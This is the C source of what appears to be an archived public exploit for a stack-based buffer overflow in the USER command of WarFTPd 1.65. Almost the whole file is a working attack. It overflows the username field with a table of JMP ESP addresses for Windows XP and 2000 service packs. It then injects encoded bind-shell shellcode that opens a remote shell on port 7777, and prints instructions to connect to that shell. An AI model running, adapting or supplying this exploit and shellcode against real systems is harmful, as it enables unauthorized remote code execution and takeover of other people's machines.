#include <stdio.h>
#include <string.h>
#include <winsock.h>

#define VULNSERVER         "WAR-FTPD 1.65"
#define VULNCMD     "\x55\x53\x45\x52\x20"
#define ZERO                        '\x00'
#define NOP                         '\x90'
#define VULNBUFF                      485
#define BUFFREAD                      128
#define PORT                           21
#define LENJMPESP                       4  

/* #############################################################################
   #####                                                                   #####
   #####                      WARFTP - VERSION 1.65                        #####
   #####                                                                   #####
   #####     WarFTP Username Stack-Based Buffer-Overflow Vulnerability     #####
   #####                                                                   #####
   #####  DESCRIPTION: WarFTP is prone to a stack-based buffer-overflow    #####
   #####     vulnerability because it fails to properly check boundaries   #####
   #####     on user-supplied data before copying it to an insufficiently  #####
   #####     sized buffer.                                                 #####
   #####                                                                   #####
   #####  FUNC VULNERABLE: sprintf(char *buffer, const char *format, argv) #####
   #####       0x004044E7: sprintf(0x00ACFB50, "%sCRLF", ExploitBuffer)    #####
   #####                                                                   #####
   #####  AFFECTED VERSION: 1.65                                           #####
   #####  USE: warftphack.exe IP_ADDRESS SO_&_SERVICE_PACK [ ESP ADDRESS ] #####
   #####     SO_&_SERVICE_PACK:                                            #####
   #####        [0]  Microsoft Windows XP Pro Spanish SP0                  #####          
   #####        [1]  Microsoft Windows XP Pro Spanish SP1                  #####
   #####        [2]  Microsoft Windows XP Pro Spanish SP2                  #####
   #####        [3]  Microsoft Windows XP Pro English SP0                  #####          
   #####        [4]  Microsoft Windows XP Pro English SP1                  #####
   #####        [5]  Microsoft Windows XP Pro English SP2                  #####   
   #####        [6]  Microsoft Windows 2000 Pro Spanish SP0                #####          
   #####        [7]  Microsoft Windows 2000 Pro Spanish SP1                #####
   #####        [8]  Microsoft Windows 2000 Pro Spanish SP2                #####
   #####        [9]  Microsoft Windows 2000 Pro Spanish SP3                #####
   #####        [10] Microsoft Windows 2000 Pro English SP0                #####          
   #####        [11] Microsoft Windows 2000 Pro English SP1                #####
   #####        [12] Microsoft Windows 2000 Pro English SP2                #####
   #####        [13] Microsoft Windows 2000 Pro English SP3                #####     
   #####        [14] Custom -> JMP ESP ADDRESS                             #####
   #####                                                                   #####  
   #####     EXAMPLE:  warftphack.exe 127.0.0.1 2                          #####
   #####     EXAMPLE2: warftphack.exe 127.0.0.1 14 0x776EDDFF              #####
   #####                                                                   #####
   #####  AUTOR: niXel - SYSCODE   (SPAIN)                                 #####
   #####  IDE: Dev-C ver-4.9.9.2                                           #####
   #####  COMPILER: MinGW                                                  #####
   #####  DEPENDENCES: Linker -> libwsock32.a                              #####
   #####  MAIL: Und3rground2002@hotmail.com                                #####
   #####                                                                   #####
   #############################################################################

      CAUTION: USER command vulnerable => no send \x40 (@) char into shellcode (user@host)
                                          no send \x0A (\n) char into shellcode
                                          no send \x0D (\r) char into shellcode
               FUNCTION sprintf => no send \x00 (\0) char into shellcode        

      ############################ BINDSHELLCODE ############################## 
                                       [7777]                                    */
                                       
char syscode[] = 
   "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x49\x49\x49"
   "\x49\x49\x49\x37\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x61"
   "\x58\x30\x42\x31\x50\x42\x41\x6b\x41\x41\x71\x32\x41\x42\x41\x32"
   "\x42\x41\x30\x42\x41\x58\x38\x41\x42\x50\x75\x6d\x39\x4b\x4c\x32"
   "\x4a\x5a\x4b\x50\x4d\x6d\x38\x6b\x49\x49\x6f\x59\x6f\x39\x6f\x35"
   "\x30\x6c\x4b\x70\x6c\x65\x74\x37\x54\x4c\x4b\x42\x65\x47\x4c\x6e"
   "\x6b\x31\x6c\x46\x65\x33\x48\x43\x31\x48\x6f\x6c\x4b\x70\x4f\x65"
   "\x48\x6c\x4b\x73\x6f\x35\x70\x37\x71\x38\x6b\x31\x59\x4c\x4b\x46"
   "\x54\x6e\x6b\x53\x31\x58\x6e\x30\x31\x6f\x30\x4f\x69\x4e\x4c\x4b"
   "\x34\x49\x50\x41\x64\x46\x67\x49\x51\x7a\x6a\x46\x6d\x43\x31\x48"
   "\x42\x5a\x4b\x38\x74\x47\x4b\x30\x54\x64\x64\x51\x38\x42\x55\x4b"
   "\x55\x4e\x6b\x53\x6f\x51\x34\x43\x31\x4a\x4b\x50\x66\x4e\x6b\x46"
   "\x6c\x42\x6b\x4c\x4b\x73\x6f\x75\x4c\x33\x31\x5a\x4b\x65\x53\x34"
   "\x6c\x6e\x6b\x6d\x59\x30\x6c\x57\x54\x55\x4c\x55\x31\x4b\x73\x74"
   "\x71\x69\x4b\x65\x34\x6e\x6b\x43\x73\x74\x70\x6c\x4b\x67\x30\x46"
   "\x6c\x6c\x4b\x70\x70\x67\x6c\x6e\x4d\x6c\x4b\x57\x30\x44\x48\x71"
   "\x4e\x72\x48\x4e\x6e\x50\x4e\x54\x4e\x38\x6c\x70\x50\x4b\x4f\x4e"
   "\x36\x71\x76\x41\x43\x31\x76\x31\x78\x76\x53\x30\x32\x53\x58\x30"
   "\x77\x44\x33\x57\x42\x63\x6f\x70\x54\x6b\x4f\x48\x50\x73\x58\x58"
   "\x4b\x58\x6d\x6b\x4c\x57\x4b\x70\x50\x6b\x4f\x6a\x76\x71\x4f\x6d"
   "\x59\x4b\x55\x65\x36\x6c\x41\x68\x6d\x53\x38\x63\x32\x42\x75\x51"
   "\x7a\x36\x62\x59\x6f\x58\x50\x71\x78\x4a\x79\x34\x49\x4b\x45\x6e"
   "\x4d\x30\x57\x69\x6f\x4e\x36\x52\x73\x41\x43\x62\x73\x76\x33\x51"
   "\x43\x70\x43\x43\x63\x73\x73\x36\x33\x6b\x4f\x4a\x70\x75\x36\x41"
   "\x78\x75\x4e\x71\x71\x35\x36\x42\x73\x4b\x39\x79\x71\x6c\x55\x70"
   "\x68\x4f\x54\x75\x4a\x32\x50\x39\x57\x52\x77\x69\x6f\x38\x56\x70"
   "\x6a\x72\x30\x50\x51\x53\x65\x4b\x4f\x58\x50\x55\x38\x6c\x64\x4c"
   "\x6d\x34\x6e\x49\x79\x66\x37\x6b\x4f\x4e\x36\x50\x53\x30\x55\x69"
   "\x6f\x4a\x70\x53\x58\x7a\x45\x41\x59\x4e\x66\x37\x39\x36\x37\x69"
   "\x6f\x59\x46\x72\x70\x50\x54\x31\x44\x33\x65\x4b\x4f\x5a\x70\x4f"
   "\x63\x51\x78\x38\x67\x50\x79\x38\x46\x43\x49\x32\x77\x4b\x4f\x4b"
   "\x66\x62\x75\x79\x6f\x6a\x70\x45\x36\x30\x6a\x52\x44\x30\x66\x41"
   "\x78\x32\x43\x72\x4d\x6f\x79\x6d\x35\x62\x4a\x42\x70\x70\x59\x74"
   "\x69\x5a\x6c\x6c\x49\x6b\x57\x41\x7a\x32\x64\x6b\x39\x68\x62\x30"
   "\x31\x6f\x30\x6b\x43\x6e\x4a\x6b\x4e\x51\x52\x34\x6d\x49\x6e\x62"
   "\x62\x36\x4c\x5a\x33\x6c\x4d\x71\x6a\x65\x68\x6e\x4b\x4c\x6b\x4e"
   "\x4b\x55\x38\x30\x72\x59\x6e\x4c\x73\x37\x66\x4b\x4f\x30\x75\x63"
   "\x74\x39\x6f\x6e\x36\x33\x6b\x36\x37\x72\x72\x31\x41\x31\x41\x46"
   "\x31\x50\x6a\x55\x51\x31\x41\x41\x41\x32\x75\x42\x71\x39\x6f\x48"
   "\x50\x50\x68\x6c\x6d\x39\x49\x45\x55\x78\x4e\x30\x53\x39\x6f\x6b"
   "\x66\x62\x4a\x79\x6f\x39\x6f\x47\x47\x39\x6f\x58\x50\x4e\x6b\x50"
   "\x57\x4b\x4c\x6c\x43\x4b\x74\x70\x64\x6b\x4f\x6a\x76\x41\x42\x49"
   "\x6f\x58\x50\x30\x68\x68\x6f\x6a\x6e\x4b\x50\x31\x70\x42\x73\x49"
   "\x6f\x58\x56\x49\x6f\x78\x50\x61";
      
int main(int argc, char ** argv) {
   char buffRead[BUFFREAD], jmpESP[LENJMPESP], ch, ch2;
   char * pbuffSend;
   unsigned int err = 0, i, k;
   int sockData, j;
   struct sockaddr_in their_addr;
   WSADATA wsaData;

   system("cls");
   fprintf(stdout, "\n\tWarFTP Username Stack-Based Buffer-Overflow Vulnerability\n");
   fprintf(stdout, "     ____________________________________________________________________\n\n");
      
   if (((argc == 3) && (atoi(argv[2]) >= 0) && (atoi(argv[2]) < 14)) || ((argc == 4) && (atoi(argv[2]) == 14))) {
   
      if (WSAStartup(MAKEWORD(2, 0), &wsaData) == 0) {
         if ((sockData = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
                       
                                            /* Server data struct */

            their_addr.sin_family = AF_INET;                      // ; Family AF_INET
            their_addr.sin_addr.s_addr = inet_addr(argv[1]);      // ; IP Address = Argv[1]
            their_addr.sin_port = htons(PORT);                    // ; Port = 21
            memset(&(their_addr.sin_zero), '0', 8);               // ; IP:Port = Argv[1]:21
      
            if (connect(sockData, (struct sockaddr *) &their_addr, sizeof(struct sockaddr)) != -1) {
               recv(sockData, buffRead, BUFFREAD, 0);
               buffRead[BUFFREAD - 1] = ZERO;
               
               if (strstr(buffRead, VULNSERVER) != NULL) {
                                    
                  /* ################################################################################# 
                     ##### BufferSend -> "USER A*VULNBUFF @JMP_ESP \x90\x90\x90\x90 SYSCODE \r\n #####
                     ################################################################################# */
                     
                  pbuffSend = (char *) malloc(strlen(VULNCMD) + VULNBUFF + LENJMPESP + (sizeof(char) * 4) + strlen(syscode) + (sizeof(char) * 2));                                      
                  if (pbuffSend != NULL) {
                     for (i=0; i < strlen(VULNCMD); i++) *(pbuffSend + i) = VULNCMD[i];
                     for (j=0; j < VULNBUFF; i++, j++) *(pbuffSend + i) = '\x41';
                      
                     /*                      - OPcodes from ntdll.dll -> JMP ESP -                     */
                     switch(atoi(argv[2])) {
                        case 0: memcpy(jmpESP, "\xE3\x39\xF4\x77", LENJMPESP); break;
                        case 1: memcpy(jmpESP, "\x0F\x98\xF8\x77", LENJMPESP); break;
                        case 2: memcpy(jmpESP, "\xED\x1E\x95\x7C", LENJMPESP); break;
                        case 3: memcpy(jmpESP, "\xE3\x39\xF4\x77", LENJMPESP); break;
                        case 4: memcpy(jmpESP, "\xCC\x59\xFA\x77", LENJMPESP); break;
                        case 5: memcpy(jmpESP, "\xED\x1E\x95\x7C", LENJMPESP); break;
                        case 6: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 7: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 8: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 9: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 10: memcpy(jmpESP, "\x8B\x94\xF8\x77", LENJMPESP); break;
                        case 11: memcpy(jmpESP, "\xAB\x67\xF9\x77", LENJMPESP); break;
                        case 12: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 13: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 14: 
                           k = 0;
                           if ((strncmp(argv[3], "0x", (sizeof(char) * 2)) == 0) && (strlen(argv[3]) == 10)) {
                              for (j=(sizeof(char) * 8) - 1; ((j >= 0) && (!err)); j--) {
                                 ch = *(argv[3] + j + 2);
                                 if (((ch > 47) && (ch < 58)) || ((ch > 64) && (ch < 71)) || ((ch > 96) && (ch < 103))) {
                                    if ((ch > 47) && (ch < 58)) ch -= 48;
                                    else if ((ch > 64) && (ch < 71)) ch -= 55;
                                    else ch -= 87;
                                    
                                    if ((j % 2) == 0) jmpESP[k++] = ((ch <<= 4) | ch2);
                                    else ch2 = ch;
                                 }
                                 else { fprintf(stderr, "\t[ ERROR ] Three parameter syntax error\n\t[ ERROR ] Example: 0xFFFFFFFF\n"); err = 1; }  
                              }             
                           }
                           else { fprintf(stderr, "\t[ ERROR ] Three parameter syntax error\n\t[ ERROR ] Example: 0xFFFFFFFF\n"); err = 1; }
                     }
                     
                     if (!err) {
                        for (j=0; j < LENJMPESP; i++, j++) *(pbuffSend + i) = jmpESP[j];
                        for (j=0; j < (sizeof(char) * 4); i++, j++) *(pbuffSend + i) = NOP;
                        for (j=0; j < strlen(syscode); i++, j++) *(pbuffSend + i) = syscode[j];
                        memcpy(pbuffSend + i, "\r\n", (sizeof(char) * 2));
                     
                        if (i == send(sockData, pbuffSend, ++i, 0)) {
                          fprintf(stdout, "\t[ OK ] Exploit buffer send to %s:%d\n", argv[1], PORT);
                          fprintf(stdout, "\t[ OK ] If you have not chosen a correct operating system and\n\t       service pack you can cause a D.O.S\n");
                          fprintf(stdout, "\t[ OK ] Connect: telnet %s 7777\n", argv[1]);
                        } 
                        else fprintf(stderr, "\t[ ERROR ] No sending all exploit buffer\n");
                     }
                     free(pbuffSend);
                  }
                  else fprintf(stderr, "\t[ ERROR ] No allocate memory\n");
               }
               else fprintf(stderr, "\t[ ERROR ] Not a vulnerable server\n");
            }
            else fprintf(stderr, "\t[ ERROR ] Connect to %s:%d\n", argv[1], PORT);
            closesocket(sockData);
         }
         else fprintf(stderr, "\t[ ERROR ] Create local socket\n");
         WSACleanup();
      }
      else fprintf(stderr, "\t[ ERROR ] Load library");
   }
   else {
      fprintf(stderr, "   [ + ] USE: %s IP_ADDRESS SERVICE_PACK [ ESP_ADDRESS ]\n\n", argv[0]);
      fprintf(stderr, "   [ + ] SERVICE PACK:  [ - ] Microsoft Windows XP Pro Spanish SP0 (0)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro Spanish SP1 (1)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro Spanish SP2 (2)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro English SP0 (3)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro English SP1 (4)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro English SP2 (5)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP0 (6)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP1 (7)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP2 (8)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP3 (9)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP0 (10)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP1 (11)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP2 (12)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP3 (13)\n");
      fprintf(stderr, "\t\t\t[ - ] Custom Service Pack - JMP %%ESP (14)\n\n");
      fprintf(stderr, "   [ + ] EXAMPLE:  %s 127.0.0.1 2\n", argv[0]);
      fprintf(stderr, "   [ + ] EXAMPLE2: %s 127.0.0.1 14 0x776EDDFF\n", argv[0]);
   }
   fprintf(stdout, "     ___________________________________________________________________\n\n");
   return 0;
}

// milw0rm.com [2007-03-25]